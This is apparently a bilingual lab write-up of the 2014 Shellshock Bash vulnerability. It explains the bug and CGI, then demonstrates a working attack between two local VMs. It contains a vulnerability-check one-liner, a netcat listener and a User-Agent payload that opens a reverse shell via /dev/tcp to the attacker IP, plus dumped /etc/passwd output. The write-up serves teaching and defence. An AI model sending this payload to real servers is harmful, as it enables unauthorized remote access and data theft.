# ðŸŽ¥ Shell Shock Vulnerability CVE-2014-6271

## ðŸ”Ž What is CVE ?
ðŸ’¬
![image](https://user-images.githubusercontent.com/118449010/206201960-90658f31-3830-43e9-9488-7a41e0aaaba8.png)
> CVE is short for `Common Vulnerabilities and Exposures.` It means publicly known information-security vulnerabilities in publicly released software packages. The informaion is then assigend a CVE ID by a CVE Numbering Authority, CNA. CVEs help IT organizations to more systematically identify security flaws and compensate for vulnerabilities. And it consists of a structure in the order of prefix, year, and numbering.
> #### <div align=center> CVE(Prefix) - 1996(Year) - 0224(Numbering) </div>
> 



## ðŸ”Ž What is Shell Shock & Bash ?
ðŸ’¬
> **The Shellshock vulnerability affects Unix-based OS System Bash, a program that various Unix-based OS systems use to execute command lines and command scripts.** It is often installed as the system's default command-line interface. Shellshock is an arbitrary code execution(In computer security, arbitrary code execution (ACE) is an attacker's ability to run any commands or code of the attacker's choice on a target machine or in a target process.) vulnerability that offers a way for users of a system to execute commands that should be unavailable to them. Usually, Attackers steal root accounts and execute malicious code through these vulnerabilities. This happens through Bash's "function export" feature, whereby one Bash process can share command scripts with other Bash processes that it executes. This feature is implemented by encoding the scripts in a table that is shared between the processes, known as the environment variable list. Each new Bash process scans this table for encoded scripts, assembles each one into a command that defines that script in the new process, and executes that command. The new process assumes that the scripts found in the list come from another Bash process, but it cannot verify this, nor can it verify that the command that it has built is a properly formed script definition. Therefore, an attacker can execute arbitrary commands on the system or exploit other bugs that may exist in Bash's command interpreter, if the attacker has a way to manipulate the environment variable list and then cause Bash to run. 
>
> **ì‰˜ì‡¼í¬ ì·¨ì•½ì ì€ ë‹¤ì–‘í•œ ìœ ë‹‰ìŠ¤ ê¸°ë°˜ ìš´ì˜ì²´ì œì—ì„œ ëª…ë ¹ì¤„ê³¼ ëª…ë ¹ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ëŠ” ë°ì— ì‚¬ìš©ë˜ëŠ” Bashì— ì˜í–¥**ì„ ì¤ë‹ˆë‹¤. BashëŠ” ì‹œìŠ¤í…œ ê¸°ë³¸ ëª…ë ¹ì¤„ ì¸í„°íŽ˜ì´ìŠ¤ë¡œì„œ ì„¤ì¹˜ë©ë‹ˆë‹¤. ì‰˜ì‡¼í¬ëŠ” ì‹œìŠ¤í…œ ì‚¬ìš©ìžê°€ ì‚¬ìš©í•  ìˆ˜ ì—†ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ì œê³µí•˜ëŠ” ìž„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ìž…ë‹ˆë‹¤. (ìž„ì˜ ì½”ë“œ ì‹¤í–‰ì€ ì»´í“¨í„° ë³´ì•ˆì—ì„œ ê³µê²©ìžê°€ ì„ íƒí•œ ì–´ë–¤ ëª…ë ¹ì´ë‚˜ ì½”ë“œë¥¼ íƒ€ê²Ÿ ì‹œìŠ¤í…œ ë˜ëŠ” íƒ€ê²Ÿ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìžˆëŠ” ëŠ¥ë ¥ì„ ë§í•©ë‹ˆë‹¤.) ì¼ë°˜ì ìœ¼ë¡œ, ê³µê²©ìžë“¤ì€ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì´ìš©í•©ë‹ˆë‹¤. ê³µê²©ìžë“¤ì€ ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ì´ìš©í•´ ë£¨íŠ¸ ê³„ì •ì„ íƒˆì·¨í•˜ê³  ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¼ì´ ë°œìƒí•˜ëŠ” ì›ì¸ì€ Bashì˜ "í•¨ìˆ˜ ë‚´ë³´ë‚´ê¸°" ê¸°ëŠ¥ìž…ë‹ˆë‹¤. ì´ëŠ” í•œ í”„ë¡œì„¸ìŠ¤ê°€ ì‹¤í–‰í•˜ëŠ” ë‹¤ë¥¸ Bash í”„ë¡œì„¸ìŠ¤ì™€ ëª…ë ¹ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ê³µìœ í•  ìˆ˜ ìžˆê²Œ í•©ë‹ˆë‹¤. í•´ë‹¹ ê¸°ëŠ¥ì€ í™˜ê²½ ë³€ìˆ˜ ëª©ë¡ìœ¼ë¡œ ì•Œë ¤ì§„ í”„ë¡œì„¸ìŠ¤ ê°„ì— ê³µìœ ë˜ëŠ” í…Œì´ë¸”ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì¸ì½”ë”©í•˜ì—¬ êµ¬í˜„ë©ë‹ˆë‹¤. ê° New Bash í”„ë¡œì„¸ìŠ¤ëŠ” í•´ë‹¹ í…Œì´ë¸”ì—ì„œ ì¸ì½”ë”©ëœ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ê²€ìƒ‰í•˜ê³ , ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ì—ì„œëŠ” ê° ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì •ì˜í•˜ëŠ” ëª…ë ¹ì–´ë¡œ êµ¬ì„±í•˜ê³ , í•´ë‹¹ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ìƒˆ í”„ë¡œì„¸ìŠ¤ì—ì„œëŠ” ëª©ë¡ì—ì„œ ì°¾ì€ ìŠ¤í¬ë¦½íŠ¸ê°€ ë‹¤ë¥¸ Bash í”„ë¡œì„¸ìŠ¤ì—ì„œ ê°€ì ¸ì˜¨ ê²ƒìœ¼ë¡œ ì¶”ì •í•˜ì§€ë§Œ ì‹¤ì œë¡œëŠ” ì´ë¥¼ ìž…ì¦í•  ìˆ˜ ì—†ì„ ë¿ë§Œ ì•„ë‹ˆë¼, ë¹Œë“œí•œ ëª…ë ¹ì–´ê°€ ì œëŒ€ë¡œ êµ¬ì„±ëœ ìŠ¤í¬ë¦½íŠ¸ ì •ì˜ì¸ì§€ í™•ì¸í•  ìˆ˜ë„ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë¯€ë¡œ, ê³µê²©ìžëŠ” í™˜ê²½ ë³‘ìˆ˜ ëª©ë¡ì„ ì¡°ìž‘í•´ì„œ Bashë¥¼ ì‹¤í–‰í•˜ê²Œ ëœë‹¤ë©´ ê³µê²©ìžëŠ” ì‹œìŠ¤í…œì—ì„œ ìž„ì˜ ëª…ë ¹(ACE)ì„ ì‹¤í–‰í•˜ê±°ë‚˜ Bashì˜ ëª…ë  ì¸í„°í”„ë¦¬í„°ì— ìžˆì„ ìˆ˜ ìžˆëŠ” ë˜ ë‹¤ë¥¸ ë²„ê·¸ë¥¼ ì´ìš©í•  ìˆ˜ ìžˆìŠµë‹ˆë‹¤.

> 


## :recycle: Shell Shock Process
![image](https://user-images.githubusercontent.com/118449010/206294250-b511a3e6-bdd9-43e9-8172-2ad249e03e0f.png)

```
Attacker sends HTTP Packets(Including malicious commands on CGI Page.
ê³µê²©ìžëŠ” CGI íŽ˜ì´ì§€ì— ì•…ì˜ì ì¸ ëª…ë ¹ì–´ë¥¼ í¬í•¨í•œ HTTP íŒ¨í‚·ì„ ì „ì†¡í•©ë‹ˆë‹¤.
```
```
When the CGI URI is transferred to the Apache Web Server, the Apache verifies the request.
Apache Web Serverì— CGI URIê°€ ì „ì†¡ëì„ ë•Œ, ApacheëŠ” í•´ë‹¹ ìš”ì²­ì„ ê²€ì‚¬í•©ë‹ˆë‹¤.
```
```
Apache Starts a new process using the fork() for CGI Requests. After that, Run the CGI Program using the exec().
ApacheëŠ” CGI ìš”ì²­ì„ fork() í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹œìž‘í•œ ë‹¤ìŒ, exec() í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ CGI í”„ë¡œê·¸ëž¨ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.
```
```
The CGI works as a **#!/bin/bash** request. That's why It use the exec() to access the Bash, and the Shell Script works.
í•´ë‹¹ CGIëŠ” **#!/bin/bash** ìš”ì²­ìœ¼ë¡œ ë™ìž‘í•˜ê¸° ë•Œë¬¸ì— exec() í•¨ìˆ˜ë¥¼ ì´ìš©í•´ Bashì— ì ‘ê·¼í•˜ê²Œ ë˜ê³ , ì‰˜ ìŠ¤í¬ë¦½íŠ¸ê°€ ë™ìž‘í•˜ê²Œ ë©ë‹ˆë‹¤.
```



## :closed_book: Attackable Versions
### CVE-2014-6271
```
bash-4.2.45-5.el7_0.2
bash-4.1.2-15.el6_5.1
bash-4.1.2-15.el6_5.1.sjis.1
bash-4.1.2-9.el6_2.1
bash-4.1.2-15.el6_4.1
bash-3.2-33.el5.1
bash-3.2-33.el5_11.1.sjis.1
bash-3.2-24.el5_6.1
bash-3.2-32.el5_9.2
bash-3.0-27.el4.2
```

## ðŸ”Ž What is CGI ?
ðŸ’¬
> CGI is short for Common Gateway Interface. It is an interface specification that enables web servers to execute an external program, typically to process user requests. Such programs are often written in a scripting language and are commonly referred to as CGI scripts, but they may include compiled programs.
> 
> CGIëŠ” Common Gateway Interfaceì˜ ì•½ì–´ìž…ë‹ˆë‹¤. CGIëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ìž ìš”ì²­ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ ì›¹ ì„œë²„ê°€ ì™¸ë¶€ í”„ë¡œê·¸ëž¨ì„ ì‹¤í–‰í•  ìˆ˜ ìžˆë„ë¡ í•˜ëŠ” ì¸í„°íŽ˜ì´ìŠ¤ ìž…ë‹ˆë‹¤. íŠ¹ì • í”„ë¡œê·¸ëž¨ë“¤ì€ ìŠ¤í¬ë¦½íŠ¸ ì–¸ì–´ë¡œ ì“°ì—¬ì ¸ ìžˆìœ¼ë©°, ì¼ë°˜ì ìœ¼ë¡œ CGI ìŠ¤í¬ë¦½íŠ¸ë¡œ ì—¬ê²¨ì§€ì§€ë§Œ ì»´íŒŒì¼ëœ í”„ë¡œê·¸ëž¨ì„ í¬í•¨í•  ìˆ˜ë„ ìžˆìŠµë‹ˆë‹¤. 
>
> When a web server uses the Common Gateway Interface (CGI) to handle a document request, it copies certain information from the request into the environment variable list and then delegates the request to a handler program. If the handler is a Bash script, or if it executes Bash, then Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted document request.
>
> ì›¹ ì„œë²„ê°€ CGIë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ì„œ ìš”ì²­ì„ ì²˜ë¦¬í•  ë•Œ, í™˜ê²½ ë³€ìˆ˜ ëª©ë¡ì— ìš”ì²­ëœ íŠ¹ì • ì •ë³´ë¥¼ ë³µì‚¬ í•œ ë‹¤ìŒ ìš”ì²­ì„ í•¸ë“¤ëŸ¬ í”„ë¡œê·¸ëž¨ì— ìœ„ìž„í•©ë‹ˆë‹¤. í•¸ë“¤ëŸ¬ê°€ Bash ìŠ¤í¬ë¦½íŠ¸ì´ê±°ë‚˜ Bashë¥¼ ì‹¤í–‰í•˜ëŠ” ê²½ìš°, BashëŠ” ì„œë²„ê°€ ì „ë‹¬í•œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ìˆ˜ì‹ í•  ê²ƒì´ê³  ì•žì—ì„œ ì„¤ëª…í•œ ëŒ€ë¡œ ë¬¸ì„œ ìš”ì²­ì„ ì²˜ë¦¬í•  ê²ƒìž…ë‹ˆë‹¤. ì´ëŠ” ê³µê²©ìžê°€ íŠ¹ìˆ˜í•˜ê²Œ ì¡°ìž‘ëœ ë¬¸ì„œ ìš”ì²­ì„ í†µí•´ ì‰˜ ì‡¼í¬ ì·¨ì•½ì ì„ ì´‰ë°œì‹œí‚¬ ìˆ˜ ìžˆìŒì„ ëœ»í•©ë‹ˆë‹¤.
> 

## :hammer: Tool
### Victim Information
<img src="https://img.shields.io/badge/Ubuntu-FFB71B?style=for-the-badge&logo=Ubuntu&logoColor=black"> <img src="https://img.shields.io/badge/Apache-D22128?style=for-the-badge&logo=Apache&logoColor=white"> <img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=VMware&logoColor=white"> 

- **OS**: Ubuntu 14.04.1 LTS
- **IP**: 192.168.0.144
- **Bash**: 4.3.11

### Attacker Information
<img src="https://img.shields.io/badge/Kali Linux-557C94?style=for-the-badge&logo=Kali Linux&logoColor=white"> <img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=VMware&logoColor=white"> 
- **OS**: Kali Linux
- **IP**: 192.168.0.138
- **Tool**: Burp-suite

# ðŸŽ¥ Attack Demonstration
## ðŸ’» Ubuntu 14.04.1
### ðŸ“„ Check for vulnerabilities
```
$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```
- **Safe** :heavy_check_mark:
```
#this,#e5e5e5 is a test
```
- **Vulnerable** :x:
```
vulnerable
this is a test
```

- ðŸ“„ make **.py** on /var/www/cgi-bin
```
sudo vim KWAKJOONHWAN_SHELLSHOCK.py
```
```python
#!/usr/bin/python3
print('Content-Type: text/plain')
print('')
print('KWAKJOONHWAN_SHELLSHOCK')
```
![a](https://user-images.githubusercontent.com/118449010/206300406-3bcc7299-76e8-4df4-ac6c-7b5ce51cec23.png)

- ðŸ“„ make **.sh** on /var/www/cgi-bin
```
sudo vim KWAKJOONHWAN_SHTEST.sh
```
```python
#!/bin/bash

echo "Content-type: text/html"
echo ""

echo '<html>'
echo '<head>'
echo '<iframe src="./KWAKJOONHWAN_SHELLSHOCK.py">'
echo '</iframe>'
echo '</head>'
echo '</html>'
```
![sh](https://user-images.githubusercontent.com/118449010/206301593-9ed0cba9-88a2-49ce-badb-299fad1a5205.png)
![3](https://user-images.githubusercontent.com/118449010/206300677-826c2434-fd7c-4307-925c-21957227c705.png)



## ðŸ’» Kali Linux
- Reverse-Shell Connection: set listen mode, for inbound connects and set the source port 8888
```
#nc -l -p port [options] [hostname] [port]
nc -nlvp 8888
```
![2](https://user-images.githubusercontent.com/118449010/206302559-0631a90c-c46b-4ed9-9a3f-a074dea6ac3a.png)

- ðŸ“„ Insert Shell Shock Attack command into the User-agent Header.
```
User-agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.0.138/8888 0>&1
```
![1](https://user-images.githubusercontent.com/118449010/206303605-cc7002c5-b817-4a7e-a31c-a9196af913c0.png)


## :scroll: Result
- Reverse Shell connection: **`connect to [192.168.0.138] from (UNKOWN) [192.168.0.144]`**

![138to144](https://user-images.githubusercontent.com/118449010/206304362-0e979d23-ba16-4fa4-abeb-134b1a304e8d.png)

- Remote Code Execution: `cat /etc/passwd`

![catetcpasswd](https://user-images.githubusercontent.com/118449010/206303977-448da67c-a320-455c-a866-72df5d036c02.png)
```
Enter: cat /etc/passwd
Result: 
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65545:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var:cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```


## ðŸ”Ž Preventive measures
- Bash Update
- Delete Unnecessary CGI Page
- Disable Unnecessary CGI Service
- BlocK with WAF, IDS, and IPS

![header](https://capsule-render.vercel.app/api?type=waving&color=auto&height=300&section=header&text=KWAK%20JOONHWAN&fontSize=90)
